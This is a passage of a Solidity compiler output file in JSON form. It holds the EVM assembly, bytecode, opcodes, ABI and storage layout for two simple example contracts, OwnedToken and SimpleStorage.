								{
									"begin": 4481,
									"end": 5183,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 4716,
									"end": 4726,
									"name": "CALLER",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4713,
									"name": "PUSH",
									"source": 4,
									"value": "1"
								},
								{
									"begin": 4708,
									"end": 4713,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "PUSH",
									"source": 4,
									"value": "100"
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "EXP",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "DUP2",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "SLOAD",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "DUP2",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "PUSH",
									"source": 4,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "MUL",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "NOT",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "AND",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "DUP4",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "PUSH",
									"source": 4,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "AND",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "MUL",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "OR",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "SSTORE",
									"source": 4
								},
								{
									"begin": 4708,
									"end": 4726,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 5141,
									"end": 5151,
									"name": "CALLER",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5125,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 5118,
									"end": 5125,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "PUSH",
									"source": 4,
									"value": "100"
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "EXP",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "DUP2",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "SLOAD",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "DUP2",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "PUSH",
									"source": 4,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "MUL",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "NOT",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "AND",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "DUP4",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "PUSH",
									"source": 4,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "AND",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "MUL",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "OR",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "SSTORE",
									"source": 4
								},
								{
									"begin": 5118,
									"end": 5152,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 5170,
									"end": 5175,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 5163,
									"end": 5167,
									"name": "PUSH",
									"source": 4,
									"value": "2"
								},
								{
									"begin": 5163,
									"end": 5175,
									"name": "DUP2",
									"source": 4
								},
								{
									"begin": 5163,
									"end": 5175,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 5163,
									"end": 5175,
									"name": "SSTORE",
									"source": 4
								},
								{
									"begin": 5163,
									"end": 5175,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 3889,
									"end": 6975,
									"name": "PUSH #[$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 3889,
									"end": 6975,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 3889,
									"end": 6975,
									"name": "PUSH [$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 3889,
									"end": 6975,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 3889,
									"end": 6975,
									"name": "CODECOPY",
									"source": 4
								},
								{
									"begin": 3889,
									"end": 6975,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 3889,
									"end": 6975,
									"name": "RETURN",
									"source": 4
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220864d2a7e09ec20b0c7c8c3c0390a6b726157753699d41d18ac2b760eb64d189664736f6c63430006060033",
									".code": [
										{
											"begin": 3889,
											"end": 6975,
											"name": "PUSH",
											"source": 4,
											"value": "80"
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "CALLVALUE",
											"source": 4
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "LT",
											"source": 4
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "SHR",
											"source": 4
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "PUSH",
											"source": 4,
											"value": "898855ED"
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "tag",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 3889,
											"end": 6975,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "tag",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "5"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "5"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "tag",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "STOP",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "tag",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 6045,
											"end": 6052,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 6045,
											"end": 6052,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 6045,
											"end": 6052,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 6045,
											"end": 6052,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 6045,
											"end": 6052,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 6045,
											"end": 6052,
											"name": "PUSH",
											"source": 4,
											"value": "100"
										},
										{
											"begin": 6045,
											"end": 6052,
											"name": "EXP",
											"source": 4
										},
										{
											"begin": 6045,
											"end": 6052,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 6045,
											"end": 6052,
											"name": "DIV",
											"source": 4
										},
										{
											"begin": 6045,
											"end": 6052,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 6045,
											"end": 6052,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 6023,
											"end": 6053,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 6023,
											"end": 6053,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 6023,
											"end": 6033,
											"name": "CALLER",
											"source": 4
										},
										{
											"begin": 6023,
											"end": 6053,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 6023,
											"end": 6053,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 6023,
											"end": 6053,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 6019,
											"end": 6082,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 6019,
											"end": 6082,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "8"
										},
										{
											"begin": 6019,
											"end": 6082,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 6075,
											"end": 6082,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 6068,
											"end": 6072,
											"name": "PUSH",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 6068,
											"end": 6082,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 6068,
											"end": 6082,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 6068,
											"end": 6082,
											"name": "SSTORE",
											"source": 4
										},
										{
											"begin": 6068,
											"end": 6082,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 6019,
											"end": 6082,
											"name": "tag",
											"source": 4,
											"value": "8"
										},
										{
											"begin": 6019,
											"end": 6082,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 5191,
											"end": 6090,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"changeName(bytes32)": "898855ed"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"_name\",\"type\":\"bytes32\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"newName\",\"type\":\"bytes32\"}],\"name\":\"changeName\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":\"OwnedToken\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":{\"keccak256\":\"0x7325d748c6c1e37fc30fcac062da88b793324299391319dbdfe1b64f7e1b94cb\",\"urls\":[\"bzz-raw://9f696e0559a5cf2d269690bc6b5575b8bd3047e5632936b44d891a9621510877\",\"dweb:/ipfs/QmU6ZzNqnNRVLV1yP7xtw5DYP14BVDHu8R9umT6fefBQ5q\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 1780,
								"contract": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC:OwnedToken",
								"label": "creator",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(TokenCreator)1866"
							},
							{
								"astId": 1782,
								"contract": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC:OwnedToken",
								"label": "owner",
								"offset": 0,
								"slot": "1",
								"type": "t_address"
							},
							{
								"astId": 1784,
								"contract": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC:OwnedToken",
								"label": "name",
								"offset": 0,
								"slot": "2",
								"type": "t_bytes32"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_bytes32": {
								"encoding": "inplace",
								"label": "bytes32",
								"numberOfBytes": "32"
							},
							"t_contract(TokenCreator)1866": {
								"encoding": "inplace",
								"label": "contract TokenCreator",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				},
				"SimpleStorage": {
					"abi": [
						{
							"inputs": [],
							"name": "get",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "x",
									"type": "uint256"
								}
							],
							"name": "set",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":27:231  contract SimpleStorage {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":27:231  contract SimpleStorage {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":27:231  contract SimpleStorage {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":27:231  contract SimpleStorage {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x60fe47b1\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x6d4ce63c\n      eq\n      tag_4\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":81:142  function set(uint x) public {\r... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_6\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_6:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":81:142  function set(uint x) public {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_7\n      jump\t// in\n    tag_5:\n      stop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":150:228  function get() public view returns (uint) {\r... */\n    tag_4:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":81:142  function set(uint x) public {\r... */\n    tag_7:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":133:134  x */\n      dup1\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":120:130  storedData */\n      0x00\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":120:134  storedData = x */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":81:142  function set(uint x) public {\r... */\n      pop\n      jump\t// out\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":150:228  function get() public view returns (uint) {\r... */\n    tag_9:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":186:190  uint */\n      0x00\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":210:220  storedData */\n      dup1\n      sload\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":203:220  return storedData */\n      swap1\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":150:228  function get() public view returns (uint) {\r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220381d7803370b25e1ecf8d094d660db2ecda0db6760699ce5195a6fb31127965064736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5060c78061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c806360fe47b11460375780636d4ce63c146062575b600080fd5b606060048036036020811015604b57600080fd5b8101908080359060200190929190505050607e565b005b60686088565b6040518082815260200191505060405180910390f35b8060008190555050565b6000805490509056fea2646970667358221220381d7803370b25e1ecf8d094d660db2ecda0db6760699ce5195a6fb31127965064736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xC7 DUP1 PUSH2 0x1F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x60FE47B1 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0x6D4CE63C EQ PUSH1 0x62 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x4B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x7E JUMP JUMPDEST STOP JUMPDEST PUSH1 0x68 PUSH1 0x88 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST DUP1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CODESIZE SAR PUSH25 0x3370B25E1ECF8D094D660DB2ECDA0DB6760699CE5195A6FB3 GT 0x27 SWAP7 POP PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER ",
							"sourceMap": "27:204:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;27:204:4;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b506004361060325760003560e01c806360fe47b11460375780636d4ce63c146062575b600080fd5b606060048036036020811015604b57600080fd5b8101908080359060200190929190505050607e565b005b60686088565b6040518082815260200191505060405180910390f35b8060008190555050565b6000805490509056fea2646970667358221220381d7803370b25e1ecf8d094d660db2ecda0db6760699ce5195a6fb31127965064736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x60FE47B1 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0x6D4CE63C EQ PUSH1 0x62 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x4B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x7E JUMP JUMPDEST STOP JUMPDEST PUSH1 0x68 PUSH1 0x88 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST DUP1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CODESIZE SAR PUSH25 0x3370B25E1ECF8D094D660DB2ECDA0DB6760699CE5195A6FB3 GT 0x27 SWAP7 POP PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER ",
